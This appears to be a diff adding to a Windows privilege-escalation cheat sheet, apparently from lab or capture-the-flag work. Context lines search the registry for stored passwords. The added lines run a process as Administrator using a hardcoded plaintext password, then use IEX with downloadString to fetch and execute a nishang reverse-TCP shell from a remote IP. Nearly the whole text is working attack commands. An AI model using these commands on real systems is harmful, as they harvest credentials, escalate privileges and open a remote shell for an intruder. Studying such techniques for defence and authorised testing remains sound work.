@@ -68,4 +68,15 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
+To login as a user in the same session:
 
+```
+$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+
+Start-Process -FilePath "powershell" -argumentlist "whoami" -Credential $cred
+
+To Gain a shell (shell.ps1 is nishang powershellreversetcp payload)
+
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.16.241:8080/shell.ps1')" -Credential $cred
+```
